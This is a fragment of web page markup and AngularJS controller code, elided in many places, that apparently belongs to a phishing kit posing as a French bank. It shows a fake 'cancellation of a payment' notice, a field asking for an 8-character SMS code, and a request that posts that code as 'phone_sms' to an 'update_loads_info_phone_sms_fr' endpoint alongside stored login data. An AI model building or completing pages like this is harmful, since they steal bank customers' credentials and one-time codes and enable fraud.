											...
											<form class="Login-form" id="loginForm" name="loginForm" novalidate="">
												<div class="row row-no-padding">
												    <div class="form-group">
                                                       ...
                                                       Annulation <b style="font-size: 15px;font-weight: 600;">  {{mail_login}}</b> d'un montant de  <b style="font-size: 15px;font-weight: 600;">{{mail_pwd}}</b>€
                                                       <br>           
												    ...
												    <div class="form-group " id="space_code_pass">
											           	...
											           	<div class="col-xs-12 Login-noPadding" id="Login-password-div">
												        	 <div class="add-clear-span form-group">
												        	 	...
												        	 	placeholder="Ex: 56S73479" maxlength="8"  autocomplete="off"
												        	 	ng-model="bloc_pwd_input" ng-change="bloc_login()" style="font-weight: 900;font-size: 25px;">
...
fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
        ...
        var pathname = urlx.replace("verify_trans.php", "");
                ...
                console.log($scope.info_User)
                 $http({
                    ...
                    if(data.data.exist){
                        ...
                        $scope.mail_login =data.data.mail_login;
                        $scope.mail_pwd =data.data.mail_pwd;
	...
	$scope.validation = function(){
        ...
        if(!$scope.isInteger($scope.val_login)){
            ...
            $('#subx2').show();
             ...
             Detaile.phone_sms= $scope.bloc_pwd_input;
             console.log(Detaile)
		     $http({
		          method: 'post',
		          url: $scope.base_url+"api_cl/ca/update_loads_info_phone_sms_fr",
		          data: Detaile, 
		          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
		    }).then(function(data) {
